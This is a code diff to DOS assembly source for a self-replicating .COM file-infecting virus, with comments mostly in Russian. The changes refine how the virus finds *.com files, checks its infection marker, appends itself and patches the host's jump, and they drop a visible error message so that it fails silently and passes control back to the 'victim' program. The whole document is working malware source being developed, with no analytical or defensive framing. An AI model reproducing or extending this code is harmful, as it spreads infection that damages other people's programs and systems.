@@ -1,13 +1,13 @@
 .model tiny
 .code
+.386
 org 100h
 start:
 
-db 0e9h, 1, 0 ; трехбайтный jmp
-db 069h ; флаг заражения (можно поменять на 0ffh, чтобы дебагер правильно понял ближайшие команды)
+    db 0e9h, 1, 0 ; трехбайтный jmp
+    db 069h ; флаг заражения (можно поменять на 0ffh, чтобы дебагер правильно понял ближайшие команды)
 
 inserted_code:
-
     mov bp, 0
 
 code:
@@ -31,37 +31,25 @@ code:
     lea dx, [bp + file_mask]
     mov ah, 4eh
     int 21h
+    jmp file_open
+
+find_next:
+    ; закрытие текущего файла и поиск следующего
+    mov ah, 3eh
+    int 21h
+    mov ah, 4fh
+    int 21h
 
 file_open:
 
-    ; opening file (file descriptor -> ax)
+    ; открытие файла (дескриптор файла -> ax)
     lea dx, [bp + file.fname]
     mov ax, 3D02h
     int 21h
-    mov bx, ax ; file descriptor (ax) -> bx
-    jnc file_err_skip
-
-file_err:
-
-    ; file error handling
-    lea dx, [bp + file_err_msg]
-    mov ah, 09h
-    int 21h
+    mov bx, ax ; дескриптор файла (ax) -> bx
     
-    mov ax, 100h
-    jmp ax
-
-file_err_skip:
-
-    ; moving carret to the end to get original size
-    mov cx, 0
-    mov dx, 0
-    mov ax, 4202h
-    int 21h
-    mov [bp + payload_offset], ax
-    mov [bp + jmp_length], ax
-    sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
-    mov [bp + victim_bp], ax
+    ; если файл не найден, возврат к оригинальной программе
+    jc redirect
     
     ; moving carret to the start
     mov cx, 0
@@ -75,21 +63,19 @@ file_err_skip:
     mov ah, 3fh
     int 21h
 
-    ; checking the infection flag
-    cmp [bp + leading_bytes + 3], 069h
-    jnz find_next_skip
+    ; проверка на метку заражения
+    cmp [bp + leading_bytes[3]], 69h
+    jz find_next
 
-find_next:
-
-    ; finding next file
-    mov ah, 3eh
+    ; moving carret to the end to get original size
+    mov cx, 0
+    mov dx, 0
+    mov ax, 4202h
     int 21h
-    mov ah, 4fh
-    int 21h
-    jc file_err
-    jmp file_open
-
-find_next_skip:
+    mov [bp + payload_offset], ax
+    mov [bp + jmp_length], ax
+    sub ax, 4 ; поправка на первые 4 байта этой программы, которые не записываем
+    mov [bp + victim_bp], ax
 
     ; moving carret to the start
     mov cx, 0
@@ -166,7 +152,8 @@ find_next_skip:
 
     ; PAYLOAD END
 
-    ; redirect to victim program
+    ; redirect to original program
+redirect:
     mov ax, 100h
     jmp ax
 
@@ -247,7 +234,6 @@ data:
     jmp_length dw ?
     
     file_mask db '*.com*', 0
-    file_err_msg db 'No any files to infect', 13, 10, '$'
 
 vir_end:
 
